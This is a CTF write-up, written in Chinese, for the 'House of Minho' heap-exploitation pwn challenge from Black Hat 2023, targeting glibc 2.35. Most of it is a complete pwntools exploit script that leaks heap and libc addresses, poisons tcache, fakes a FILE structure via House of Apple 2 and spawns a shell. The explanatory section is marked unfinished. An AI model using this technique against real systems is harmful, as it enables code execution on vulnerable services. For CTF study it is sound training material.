# pwn-2

House of Minho

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |yes   |
|libc  |2.35-0ubuntu3.1|

## 解题思路

这道题出自[Black Hat 2023 中的一题](https://bbs.kanxue.com/thread-279588.htm)，
本文需要读者先阅读这篇文章了解相关利用手法，这样看题解效率更高

TODO unfinished

这个exp的成功概率只有1/8，因为House of Apple 2对`_flags`有要求，
`_flags & (_IO_NO_WRITES | _IO_UNBUFFERED | _IO_CURRENTLY_PUTTING) == 0`，
`_flags`在开启了aslr后是随机的，因此这些位都有可能是1

## EXPLOIT

```python
from pwn import *
import inspect
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'

def payload(lo:int):
    global sh
    if lo:
        if lo & 4:
            EXE = './orig'
            libc = ELF('/usr/lib/libc.so.6')
            arena = 0x1daac0
        else:
            EXE = './minho'
            libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6')
            arena = 0x219c80
        sh = process(EXE)
    else:
        sh = remote('', 9999)

    def dbg():
        if lo & 2:
            gdb.attach(sh, 'b malloc\nb free')
            # gdb.attach(sh, 'b _IO_flush_all\nc')

    elf = ELF(EXE)

    def malloc(large:bool, cont:bytes):
        sh.sendlineafter(b'3:', b'1')
        sh.sendlineafter(b'big', b'2' if large else b'1')
        sleep(0.25)
        sh.send(cont)

    def free():
        sh.sendlineafter(b'3:', b'2')
        # if sh.recvuntil(b'wrong', timeout=0.125):
        #     warn(f'freeing null chunk @ line {inspect.stack()[1].lineno}')

    def show() -> bytes:
        sh.sendlineafter(b'3:', b'3')
        return sh.recvuntil(b'1:', True)

    def malloc0x10():
        sh.sendlineafter(b'3:', b'4')

    def eout():
        sh.sendlineafter(b'3:', b'5')

    def malloc0x1000():
        sh.sendlineafter(b'3:', b'6')
    
    PROTECT_PTR = lambda pos, ptr: (pos >> 12) ^ ptr
        
    # Step 1, leak heapBase
    malloc(False, b'\n')
    free()
    malloc(True, b'\n')
    free()
    malloc(False, b'FLAG'.rjust(0x20))
    val = show()
    idx = val.index(b'FLAG') + 4
    heapBase = u64(val[idx:idx + 5] + b'\0\0\0') << 12
    success(GOLD_TEXT(f'Leak heapBase: {hex(heapBase)}'))

    # Step 2, leak libcBase
    free()
    malloc(False, b'0'*0x10 + p64(0) + p64(0x61))
    free()
    malloc(True, b'0'*0x50 + p64(0) + p64(0xcf1))
    malloc0x1000() # put top_chunk in unsorted bin
    free()
    malloc(True, b'FLAG'.rjust(0x60))
    val = show()
    idx = val.index(b'FLAG') + 4
    
    mainArena = u64(val[idx:idx + 6] + b'\0\0') - 0x60 # sub unsorted bin offset
    libcBase = mainArena - arena
    success(GOLD_TEXT(f'Leak libcBase: {hex(libcBase)}'))

    # Step 3, shrink old top_chunk and put it in small bin
    malloc0x10() # clear the remaining tcache chunk
    free()
    malloc(True, b'0'*0x50 +                                     # the size of "small bin" we can control is 0x21
           p64(0) + p64(0x21) + p64(libcBase + arena + 0x60)*2 + # shrink chunk size from 0xcf1 to 0x21
           p64(0x20) + p64(0x10) + p64(0) + p64(0x11))           # 2 lookout chunks to make forced chunk legal
    malloc0x1000() # trigger malloc_consolidate()

    # Step 4, force a small bin chain to control tcache
    heap = heapBase + 0x310
    free()
    malloc(True, b'0'*0x50 + 
           p64(0) + p64(0x21) + p64(heap) + p64(heap + 0x20) +
           p64(0) + p64(0x21) + p64(heap) + p64(heap + 0x40) + 
           p64(0) + p64(0x21) + p64(heap + 0x20) + p64(libcBase + arena + 112) + # main_arena + 112 is the "bin" to end 
           p64(0x20) + p64(0x10) + p64(0) + p64(0x11))                           # small bin stashing for chunks with this size

    ioListAll = libcBase + libc.symbols['_IO_list_all']
    wjumps = libcBase + libc.symbols['_IO_wfile_jumps']

    # Step 5, leak tcache_key (we'll use it later)
    free()
    malloc(False, b'\n') # trigger small bin stash to tcache
    free()
    malloc(True, b'FLAG'.rjust(0x68))
    val = show()
    idx = val.index(b'FLAG') + 4
    tcache_key = u64(val[idx:idx + 8])
    success(f'Leak tcache_key: {hex(tcache_key)}')

    # Step 6, overwrite the fd of first chunk and put it on tcache entries
    free()          # before: tcache entry -> heap -> heap + 0x20 -> heap + 0x40
    malloc(True, b'0'*0x50 + p64(0) + p64(0x21) + p64(PROTECT_PTR(heap, ioListAll)))
    malloc0x10()    # later : tcache entry -> _IO_list_all -> ???

    # force House of Apple 2
    file = flat({
        0x0: b'  sh;',                      # flag NOTE will be overwritten when free
        0x28: 1,                            # _IO_write_ptr
        0x58: 0x21,                         # chunk_size (chain)
        0x60: PROTECT_PTR(heap, ioListAll), # fd (fileno)
        0x68: tcache_key,                   # key (_old_offset)
        0x98: libcBase + 0xebcf1,           # NOTE so we can only use one_gadget (2.39 not available)
        0xa0: heap - 0x50,                  # _wide_data
        0xd8: wjumps,                       # vtable
        0xe0: heap - 0x20                   # wide data vtable
        }, filler=b'\0')

    # Step 7, write fake file and then write _IO_list_all
    dbg()
    free()
    malloc(True, file) # write the whole structure
    free() # but flag is overwritten when free
    malloc(False, p64(heap - 0x50)) # write fake file on _IO_list_all
    eout() # exit to trigger House of Apple 2

    sh.clean()
    sh.interactive()
```

## 参考文献

[Black Hat 2023 0解Pwn题Houseofminho详细WP](https://bbs.kanxue.com/thread-279588.htm)
